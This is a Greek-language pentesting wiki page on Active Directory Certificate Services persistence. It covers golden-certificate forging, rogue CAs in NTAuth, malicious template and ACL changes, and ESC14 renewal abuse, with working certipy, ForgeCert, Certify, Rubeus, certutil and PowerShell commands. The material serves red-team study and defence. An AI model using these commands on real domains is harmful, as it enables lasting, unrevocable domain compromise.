# Persistence στον τομέα μέσω AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή είναι μια σύνοψη των τεχνικών persistence στον τομέα που παρουσιάζονται στο [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Ανατρέξτε σε αυτό για περισσότερες λεπτομέρειες.<sup>[[5]](#references)</sup>

## Πλαστογράφηση πιστοποιητικών με κλεμμένα πιστοποιητικά CA (Golden Certificate) - DPERSIST1

Πώς μπορείτε να καταλάβετε αν ένα πιστοποιητικό είναι πιστοποιητικό CA;

Μπορεί να διαπιστωθεί ότι ένα πιστοποιητικό είναι πιστοποιητικό CA αν ισχύουν αρκετές προϋποθέσεις:<sup>[[5]](#references)</sup>

- Το πιστοποιητικό είναι αποθηκευμένο στον διακομιστή CA, με το ιδιωτικό του κλειδί ασφαλισμένο από το DPAPI του μηχανήματος ή από υλικό όπως TPM/HSM, αν το υποστηρίζει το λειτουργικό σύστημα.
- Τα πεδία Issuer και Subject του πιστοποιητικού αντιστοιχούν στο distinguished name της CA.
- Η επέκταση "CA Version" υπάρχει αποκλειστικά στα πιστοποιητικά CA.
- Το πιστοποιητικό δεν διαθέτει πεδία Extended Key Usage (EKU).

Για την εξαγωγή του ιδιωτικού κλειδιού αυτού του πιστοποιητικού, η υποστηριζόμενη μέθοδος είναι η χρήση του εργαλείου `certsrv.msc` στον διακομιστή CA, μέσω του ενσωματωμένου GUI. Ωστόσο, αυτό το πιστοποιητικό δεν διαφέρει από τα υπόλοιπα που είναι αποθηκευμένα στο σύστημα· επομένως, μπορούν να εφαρμοστούν για την εξαγωγή του μέθοδοι όπως η τεχνική [THEFT2](certificate-theft.md#user-certificate-theft-via-dpapi-theft2).

Το πιστοποιητικό και το ιδιωτικό κλειδί μπορούν επίσης να ληφθούν με το Certipy χρησιμοποιώντας την ακόλουθη εντολή:<sup>[[2]](#references)</sup>

```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```

Μετά την απόκτηση του πιστοποιητικού CA και του ιδιωτικού κλειδιού του σε μορφή `.pfx`, μπορούν να χρησιμοποιηθούν εργαλεία όπως το [ForgeCert](https://github.com/GhostPack/ForgeCert) για τη δημιουργία έγκυρων πιστοποιητικών:

```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```

> [!WARNING]
> Ο χρήστης που επιλέγεται ως στόχος για την πλαστογράφηση πιστοποιητικού πρέπει να είναι ενεργός και να μπορεί να πραγματοποιήσει authentication στο Active Directory, ώστε να πετύχει η διαδικασία. Η πλαστογράφηση πιστοποιητικού για ειδικούς λογαριασμούς, όπως ο krbtgt, είναι αναποτελεσματική.

Αυτό το πλαστογραφημένο πιστοποιητικό θα είναι **έγκυρο** μέχρι την ημερομηνία λήξης που έχει οριστεί και **όσο το πιστοποιητικό της root CA παραμένει έγκυρο** (συνήθως από 5 έως και **10+ χρόνια**). Είναι επίσης έγκυρο για **μηχανήματα**, επομένως, σε συνδυασμό με το **S4U2Self**, ένας attacker μπορεί να **διατηρήσει persistence σε οποιοδήποτε μηχάνημα του domain** για όσο διάστημα είναι έγκυρο το πιστοποιητικό της CA.\
Επιπλέον, τα **πιστοποιητικά που δημιουργούνται** με αυτήν τη μέθοδο **δεν μπορούν να ανακληθούν**, καθώς η CA δεν γνωρίζει την ύπαρξή τους.

### Λειτουργία υπό το Strong Certificate Mapping Enforcement (2025+)

Από τις 11 Φεβρουαρίου 2025 (μετά την εφαρμογή του KB5014754), οι domain controllers χρησιμοποιούν από προεπιλογή το **Full Enforcement** για τις αντιστοιχίσεις πιστοποιητικών. Πρακτικά, αυτό σημαίνει ότι τα πλαστογραφημένα πιστοποιητικά σας πρέπει είτε:

- Να περιέχουν ισχυρή σύνδεση με τον λογαριασμό-στόχο (για παράδειγμα, την επέκταση ασφαλείας SID), ή
- Να συνοδεύονται από ισχυρή, ρητή αντιστοίχιση στο attribute `altSecurityIdentities` του αντικειμένου-στόχου.<sup>[[1]](#references)</sup>

Μια αξιόπιστη προσέγγιση για persistence είναι να δημιουργήσετε ένα πλαστογραφημένο πιστοποιητικό που συνδέεται μέσω certificate chain με την κλεμμένη Enterprise CA και στη συνέχεια να προσθέσετε μια ισχυρή, ρητή αντιστοίχιση στο principal-θύμα:

```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

Σημειώσεις
- Αν μπορείτε να δημιουργήσετε πλαστά certificates που περιλαμβάνουν το SID security extension, αυτά θα αντιστοιχιστούν έμμεσα ακόμη και με το Full Enforcement. Διαφορετικά, προτιμήστε explicit strong mappings. Για περισσότερες πληροφορίες σχετικά με τα explicit mappings, δείτε το [account-persistence](account-persistence.md).
- Η ανάκληση δεν βοηθά τους defenders εδώ: τα πλαστά certificates είναι άγνωστα στη βάση δεδομένων της CA και, επομένως, δεν μπορούν να ανακληθούν.

#### Πλαστογράφηση συμβατή με το Full Enforcement (SID-aware)

Τα ενημερωμένα εργαλεία σάς επιτρέπουν να ενσωματώσετε απευθείας το SID, διατηρώντας τα golden certificates αξιοποιήσιμα ακόμη και όταν οι DCs απορρίπτουν τα weak mappings:<sup>[[3]](#references)</sup>

```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
  --upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  --outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
  -sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```

Ενσωματώνοντας το SID, αποφεύγετε να χρειαστεί να τροποποιήσετε το `altSecurityIdentities`, το οποίο ενδέχεται να παρακολουθείται, ενώ εξακολουθείτε να ικανοποιείτε τους ελέγχους ισχυρής αντιστοίχισης.

## Εμπιστοσύνη σε μη εξουσιοδοτημένα πιστοποιητικά CA - DPERSIST2

Το αντικείμενο `NTAuthCertificates` έχει οριστεί να περιέχει ένα ή περισσότερα **πιστοποιητικά CA** στο χαρακτηριστικό `cacertificate`, το οποίο χρησιμοποιεί το Active Directory (AD). Η διαδικασία επαλήθευσης από τον **ελεγκτή τομέα** περιλαμβάνει τον έλεγχο του αντικειμένου `NTAuthCertificates` για καταχώριση που αντιστοιχεί στην **CA που καθορίζεται** στο πεδίο Issuer του **πιστοποιητικού** που χρησιμοποιείται για τον έλεγχο ταυτότητας. Ο έλεγχος ταυτότητας συνεχίζεται εάν βρεθεί αντιστοιχία.<sup>[[5]](#references)</sup>

Ένας εισβολέας μπορεί να προσθέσει ένα αυτοϋπογεγραμμένο πιστοποιητικό CA στο αντικείμενο `NTAuthCertificates`, εφόσον έχει τον έλεγχο αυτού του αντικειμένου AD. Κανονικά, μόνο τα μέλη της ομάδας **Enterprise Admin**, καθώς και οι **Domain Admins** ή οι **Administrators** στον **τομέα ρίζας του forest**, έχουν δικαίωμα τροποποίησης αυτού του αντικειμένου. Μπορούν να επεξεργαστούν το αντικείμενο `NTAuthCertificates` χρησιμοποιώντας το `certutil.exe` με την εντολή `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` ή χρησιμοποιώντας το [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Πρόσθετες χρήσιμες εντολές για αυτήν την τεχνική:

```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```

Αυτή η δυνατότητα είναι ιδιαίτερα σχετική όταν χρησιμοποιείται σε συνδυασμό με τη μέθοδο που περιγράφηκε προηγουμένως, η οποία χρησιμοποιεί το ForgeCert για τη δυναμική δημιουργία πιστοποιητικών.

> Ζητήματα αντιστοίχισης μετά το 2025: η προσθήκη μιας rogue CA στο NTAuth καθιερώνει εμπιστοσύνη μόνο στην CA που εκδίδει τα πιστοποιητικά. Για να χρησιμοποιηθούν leaf certificates για σύνδεση όταν οι DC βρίσκονται σε **Full Enforcement**, το leaf πρέπει είτε να περιέχει την επέκταση ασφαλείας SID είτε να υπάρχει ισχυρή ρητή αντιστοίχιση στο αντικείμενο-στόχο (για παράδειγμα, Issuer+Serial στο `altSecurityIdentities`). Δείτε {{#ref}}account-persistence.md{{#endref}}.

## Κακόβουλη εσφαλμένη ρύθμιση - DPERSIST3

Οι ευκαιρίες για **persistence** μέσω **τροποποιήσεων των security descriptor** των στοιχείων του AD CS είναι πολλές. Οι τροποποιήσεις που περιγράφονται στην ενότητα "[Κλιμάκωση τομέα](domain-escalation.md)" μπορούν να εφαρμοστούν κακόβουλα από attacker με αυξημένη πρόσβαση. Σε αυτές περιλαμβάνεται η προσθήκη «δικαιωμάτων ελέγχου» (π.χ. WriteOwner/WriteDACL/etc.) σε ευαίσθητα στοιχεία, όπως:<sup>[[5]](#references)</sup>

- Το αντικείμενο **AD computer του CA server**
- Ο **RPC/DCOM server του CA server**
- Οποιοδήποτε **απόγονο AD object ή container** στο **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (για παράδειγμα, το Certificate Templates container, το Certification Authorities container, το NTAuthCertificates object κ.λπ.)
- **AD groups στα οποία ο οργανισμός έχει αναθέσει ρητά δικαιώματα ελέγχου CA ή template**. Η ενσωματωμένη ομάδα Cert Publishers είναι εξουσιοδοτημένη να δημοσιεύει πιστοποιητικά σε user objects στο AD· η συμμετοχή στην ομάδα από μόνη της δεν παρέχει δικαιώματα ελέγχου CA ή template ούτε δικαιώματα enrollment. Ελέγξτε ξεχωριστά τα σχετικά δικαιώματα CA και template. Δείτε την [περιγραφή της Microsoft για το Cert Publishers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) και τα [δικαιώματα certificate template](https://learn.microsoft.com/en-us/intune/configmgr/protect/plan-design/planning-for-certificate-template-permissions).

Ένα παράδειγμα κακόβουλης εφαρμογής θα ήταν ένας attacker με **αυξημένα δικαιώματα** στον τομέα να προσθέσει το δικαίωμα **`WriteOwner`** στο προεπιλεγμένο certificate template **`User`**, ορίζοντας τον εαυτό του ως principal για αυτό το δικαίωμα. Για να το εκμεταλλευτεί, ο attacker θα άλλαζε πρώτα τον ιδιοκτήτη του template **`User`** στον εαυτό του. Στη συνέχεια, θα όριζε το **`mspki-certificate-name-flag`** σε **1** στο template, ενεργοποιώντας το **`ENROLLEE_SUPPLIES_SUBJECT`** και επιτρέποντας σε έναν user να παρέχει Subject Alternative Name στο αίτημα. Έπειτα, ο attacker θα μπορούσε να κάνει **enroll** χρησιμοποιώντας το **template**, επιλέγοντας ως εναλλακτικό όνομα το όνομα ενός **domain administrator**, και να χρησιμοποιήσει το πιστοποιητικό που απέκτησε για authentication ως DA.

Πρακτικές ρυθμίσεις που μπορεί να ορίσουν οι attackers για μακροχρόνιο domain persistence (δείτε το {{#ref}}domain-escalation.md{{#endref}} για πλήρεις λεπτομέρειες και εντοπισμό):

- CA policy flags που επιτρέπουν SAN από τους αιτούντες (π.χ. ενεργοποίηση του `EDITF_ATTRIBUTESUBJECTALTNAME2`). Έτσι, παραμένουν εκμεταλλεύσιμα μονοπάτια τύπου ESC1.
- DACL ή ρυθμίσεις template που επιτρέπουν την έκδοση πιστοποιητικών κατάλληλων για authentication (π.χ. προσθήκη του Client Authentication EKU, ενεργοποίηση του `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Έλεγχος του αντικειμένου `NTAuthCertificates` ή των CA containers, ώστε να επανεισάγονται συνεχώς rogue issuers, αν οι defenders επιχειρήσουν cleanup.

> [!TIP]
> Σε ενισχυμένα περιβάλλοντα μετά το KB5014754, ο συνδυασμός αυτών των εσφαλμένων ρυθμίσεων με ρητές ισχυρές αντιστοιχίσεις (`altSecurityIdentities`) διασφαλίζει ότι τα πιστοποιητικά που εκδώσατε ή πλαστογραφήσατε παραμένουν αξιοποιήσιμα ακόμη και όταν οι DC επιβάλλουν ισχυρή αντιστοίχιση.

### Κατάχρηση ανανέωσης πιστοποιητικού (ESC14) για persistence

Αν παραβιάσετε ένα πιστοποιητικό κατάλληλο για authentication (ή ένα πιστοποιητικό Enrollment Agent), μπορείτε να το **ανανεώνετε επ’ αόριστον**, όσο το issuing template παραμένει δημοσιευμένο και η CA εξακολουθεί να εμπιστεύεται την αλυσίδα εκδότη. Η ανανέωση διατηρεί τις αρχικές αντιστοιχίσεις ταυτότητας, αλλά παρατείνει την ισχύ του πιστοποιητικού, δυσχεραίνοντας την αφαίρεσή του, εκτός αν διορθωθεί το template ή γίνει republish της CA.<sup>[[4]](#references)</sup>

```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```

Αν οι domain controllers βρίσκονται σε **Full Enforcement**, προσθέστε `-sid <victim SID>` (ή χρησιμοποιήστε ένα template που εξακολουθεί να περιλαμβάνει την επέκταση ασφαλείας SID), ώστε το ανανεωμένο leaf certificate να συνεχίσει να αντιστοιχίζεται ισχυρά χωρίς να πειραχτεί το `altSecurityIdentities`. Οι επιτιθέμενοι με δικαιώματα διαχειριστή CA μπορούν επίσης να τροποποιήσουν το `policy\RenewalValidityPeriodUnits`, ώστε να παρατείνουν τη διάρκεια ισχύος των ανανεωμένων πιστοποιητικών προτού εκδώσουν ένα πιστοποιητικό για τον εαυτό τους.<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – Αλλαγές στον έλεγχο ταυτότητας βάσει πιστοποιητικών στους ελεγκτές τομέα των Windows (χρονοδιάγραμμα επιβολής και ισχυρές αντιστοιχίσεις)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Αναφορά εντολών και χρήση των forge/auth](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (ενσωματωμένο forge με υποστήριξη SID)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [Επισκόπηση κατάχρησης ανανέωσης ESC14](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: Κατάχρηση των Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
{{#include ../../../banners/hacktricks-training.md}}
